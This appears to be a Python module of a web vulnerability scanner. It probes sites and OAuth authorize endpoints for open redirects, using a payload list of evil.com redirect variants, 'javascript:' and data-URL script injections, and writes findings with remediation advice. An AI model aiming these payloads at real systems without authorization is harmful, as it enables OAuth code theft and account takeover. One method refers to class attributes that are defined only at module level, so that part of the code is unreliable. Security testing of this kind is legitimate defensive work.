"""
AmonStrike — Open Redirect Module
Open redirects chain into OAuth token theft → ATO.
"""
import re
from .base import BaseModule

REDIRECT_PARAMS = [
    "redirect","redirect_uri","redirect_url","return","return_url",
    "returnTo","return_to","next","next_url","goto","go","url",
    "destination","dest","target","to","continue","forward","ref",
    "location","back","redir","rurl","origin","callback",
]

PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "/\\evil.com",
    "https://evil.com%2F@target.com",
    "https://target.com.evil.com",
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "%0d%0ahttps://evil.com",
    "https://evil.com?target.com",
]

EVIL = "evil.com"


class OpenRedirectModule(BaseModule):
    NAME        = "open_redirect"
    DESCRIPTION = "Open redirect — standalone + OAuth chain escalation"

    def run(self):
        self.log("Testing open redirects...")

        self._test_params()
        self._test_oauth_endpoints()

        self.log(f"Open redirect complete — {len(self.findings)} findings", "+")
        return self.result()

    def _test_params(self):
        # Spider for redirect endpoints first
        r0 = self.get("")
        if r0:
            import re as _re
            links = _re.findall(r'href=["\'"]([^"\'#]+)["\'"]', r0.text)
            for link in links[:20]:
                if link.startswith("/"): link = f"{self.parsed.scheme}://{self.parsed.netloc}{link}"
                for param in self.REDIRECT_PARAMS[:5]:
                    for payload in self.PAYLOADS[:3]:
                        r = self.get(link.split("?")[0].replace(self.url,""), 
                                    params={param: payload}, allow_redirects=False)
                        if r and r.status_code in [301,302,303,307,308]:
                            loc = r.headers.get("Location","")
                            if "evil.com" in loc or "javascript:" in loc:
                                self._report(param, payload, r); return

    def _test_params_original(self):
        for param in REDIRECT_PARAMS:
            for payload in PAYLOADS[:5]:
                r = self.get(params={param: payload}, allow_redirects=False)
                if not r:
                    continue
                if r.status_code in [301,302,303,307,308]:
                    loc = r.headers.get("Location","")
                    if EVIL in loc or "javascript:" in loc or "data:" in loc:
                        self._report(param, payload, r)
                        break

    def _test_oauth_endpoints(self):
        """Find OAuth endpoints and test redirect_uri manipulation."""
        oauth_paths = [
            "/oauth/authorize", "/auth/oauth", "/oauth2/authorize",
            "/connect/authorize", "/api/oauth/authorize",
        ]
        for path in oauth_paths:
            r = self.get(path)
            if not r or r.status_code == 404:
                continue
            # Test redirect_uri
            for payload in PAYLOADS[:3]:
                params = {
                    "response_type": "code",
                    "client_id":     "test",
                    "redirect_uri":  payload,
                    "scope":         "openid email",
                }
                r2 = self.get(path, params=params, allow_redirects=False)
                if r2 and r2.status_code in [301,302]:
                    loc = r2.headers.get("Location","")
                    if EVIL in loc:
                        self.add_finding(
                            title       = f"OAuth redirect_uri Open Redirect → ATO Risk",
                            severity    = "CRITICAL",
                            description = (
                                f"OAuth endpoint {path} accepts arbitrary redirect_uri. "
                                f"Attacker can steal authorization codes via crafted link → ATO."
                            ),
                            evidence    = f"Path: {path}\nredirect_uri: {payload}\nLocation: {loc}",
                            remediation = "Strictly validate redirect_uri against registered values. Never use prefix/suffix matching.",
                            url         = self.url + path,
                            parameter   = "redirect_uri",
                            payload     = payload,
                            cve         = "CWE-601",
                        )
                        break

    def _report(self, param, payload, r):
        loc = r.headers.get("Location","")
        oauth = any(o in self.url for o in ["oauth","auth","login","sso"])
        sev   = "HIGH" if oauth else "MEDIUM"
        self.add_finding(
            title       = f"Open Redirect via '{param}' Parameter",
            severity    = sev,
            description = (
                f"Parameter '{param}' redirects to attacker-controlled URL. "
                + ("On an auth/OAuth endpoint, this enables token theft and ATO." if oauth else "")
            ),
            evidence    = f"Parameter: {param}\nPayload: {payload}\nLocation header: {loc}",
            remediation = "Validate redirect URLs against a strict allowlist. Never redirect to user-supplied absolute URLs.",
            url         = self.url,
            parameter   = param,
            payload     = payload,
            cve         = "CWE-601",
        )
